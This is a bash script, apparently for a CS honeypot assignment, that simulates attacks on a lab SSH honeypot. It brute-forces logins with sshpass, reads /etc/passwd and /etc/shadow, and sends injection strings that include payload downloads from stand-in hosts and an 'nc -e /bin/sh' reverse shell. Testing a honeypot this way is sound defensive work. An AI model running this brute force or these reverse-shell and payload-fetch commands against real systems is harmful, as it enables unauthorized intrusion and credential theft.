#!/bin/bash
# SSH Honeypot Attack Simulation Script
# Designed for CS honeypot assignment testing

TARGET="172.20.0.40"

USERS=("root" "admin" "ubuntu" "test" "nobody")
PASSWORDS=("password" "123456" "admin" "root" "letmein" "wrongpass")

echo "======================================="
echo " SSH Honeypot Attack Simulation"
echo " Target: $TARGET (port 22)"
echo "======================================="
echo ""

# ---------------------------------------
# Test 1: Brute Force Authentication
# ---------------------------------------
echo "[*] Test 1: Brute Force Login Attempts"
echo "---------------------------------------"

for user in "${USERS[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    echo "[+] Trying $user:$pass"
    sshpass -p "$pass" ssh \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=5 \
      $user@$TARGET exit 2>/dev/null
    sleep 1
  done
done

echo ""
echo "[✓] Brute force simulation complete"
echo ""

# ---------------------------------------
# Test 2: Valid Login + Command Execution
# ---------------------------------------
echo "[*] Test 2: Command Execution Attempts"
echo "---------------------------------------"

COMMANDS=(
  "whoami"
  "pwd"
  "ls"
  "ls /"
  "ls /etc"
  "cd /etc && ls"
  "uname -a"
  "cat /etc/passwd"
)

for cmd in "${COMMANDS[@]}"; do
  echo "[+] Executing: $cmd"
  sshpass -p "password" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    admin@$TARGET "$cmd" 2>/dev/null
  sleep 1
done

echo ""
echo "[✓] Command execution test complete"
echo ""

# ---------------------------------------
# Test 3: Command Injection / Recon Attempts
# ---------------------------------------
echo "[*] Test 3: Command Injection Attempts"
echo "---------------------------------------"

INJECTION_CMDS=(
  "ls; whoami"
  "whoami && uname -a"
  "cat /etc/shadow"
  "wget http://malicious.site/payload.sh"
  "curl http://bad.site/exploit"
  "nc -e /bin/sh 1.2.3.4 4444"
)

for cmd in "${INJECTION_CMDS[@]}"; do
  echo "[+] Injecting: $cmd"
  sshpass -p "password" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    admin@$TARGET "$cmd" 2>/dev/null
  sleep 1
done

echo ""
echo "[✓] Injection attempts complete"
echo ""

# ---------------------------------------
# Test 4: Rapid Connections (Scan Simulation)
# ---------------------------------------
echo "[*] Test 4: Rapid Connection Attempts"
echo "---------------------------------------"

for i in {1..5}; do
  echo "[+] Rapid connection $i"
  sshpass -p "scan" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=2 \
    scanner@$TARGET exit 2>/dev/null &
done

wait

echo ""
echo "======================================="
echo " All Tests Completed"
echo "======================================="
echo ""
echo "Check logs with:"
echo "  cat logs/honeypot.log"
echo ""
